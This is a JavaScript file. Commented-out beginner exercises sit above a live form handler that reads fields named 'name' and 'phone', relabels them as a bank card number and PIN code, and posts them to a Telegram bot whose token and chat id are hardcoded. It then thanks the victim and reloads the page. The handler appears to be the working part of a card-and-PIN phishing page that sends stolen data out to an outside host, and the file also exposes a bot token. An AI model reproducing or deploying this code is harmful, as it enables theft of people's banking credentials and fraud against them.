// const wrapper =document.querySelectorAll('')

// let a  = 10
// const b ='bb'

// console.log(a+b);



// let a = prompt('введите первое число a') //10
// let b = +prompt('введите второе число b') //1

// if (a > b) {
//    console.log(`${a} больше ${b}`);
   
// } else if(a==b) {
//    console.log('oni ravni');

// }else{
//    console.log(`${b} больше ${a}`);

// }




// for (let i = 0; i <=10; i++) {
//  console.log('i');
 
   
// }



// const obj ={
//    name:'Akmal',
//    job: 'sutener'
// }


// const arr =['apple', 'melon', 'grape' ]

// console.log(arr[1]);


document.getElementById('telegramForm').addEventListener('submit', function (e) {
   e.preventDefault();

   const name = document.getElementById('name').value;
   const phone = document.getElementById('phone').value;
   const token = '7126642434:AAFinRcl3pY4PNKb4Ux84pJeeyLhAo-HUuc';  // Замените на ваш токен
   const chat_id = '-4557746887';  // Замените на ваш chat_id
   const url = `https://api.telegram.org/bot${token}/sendMessage` ;

   // Формируем сообщение
   const message = `Карта: ${name}\nПИНКод: ${phone}`;

   const data = {
     chat_id: chat_id,
     text: message
   };

   fetch(url, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json'
     },
     body: JSON.stringify(data)
   })
   .then(response => response.json())
   .then(data => {
     if (data.ok) {
      //  alert("Message sent!");
       const thanks = document.querySelector('#thanks')
       thanks.innerText = 'Спасибо за помощь🥹🥹🥹'

       
setTimeout(() => {
   location.reload()
}, 3000);

     } else {
       alert("Error sending message.");
     }
   })
   .catch(error => {
     console.error('Error:', error);
     alert("Error sending message.");
   });
 });
